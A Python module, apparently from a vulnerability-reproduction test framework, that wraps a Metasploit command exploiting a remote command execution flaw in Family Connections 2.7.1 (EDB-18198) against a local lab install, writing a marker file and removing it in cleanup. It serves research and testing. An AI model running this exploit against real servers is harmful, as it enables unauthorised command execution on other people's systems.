import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "EDB_18198",
                  'Description' : "Family Connections less.php Remote Command Execution"
                                  "Authentication isn't required to exploit"
				  "the vulnerability but register_globals must be set to On."
                                  "Requires PHP < 5.4 due to the register_gobals dependancy.",
                  'References' :  [['EDB', '18198']],
                  'Target' :      "Family Connections 2.7.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }
                                

    def __init__(self):
        framework.Exploit.__init__(self)
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()

        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/familycms_less_exec " \
                         "RHOST=127.0.0.1 URI=/family/ PAYLOAD=cmd/unix/generic cmd='echo \"owned\" > /var/www/family/owned.txt' E"
        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("Done! http://localhost/family/owned.txt should now exist.")
        driver.cleanup()
        return

    def cleanup(self, system_dir):
        self.logger.info("Removing /var/www/family/owned.txt")
        os.system("rm " + system_dir + "/var/www/family/owned.txt")
        
        return
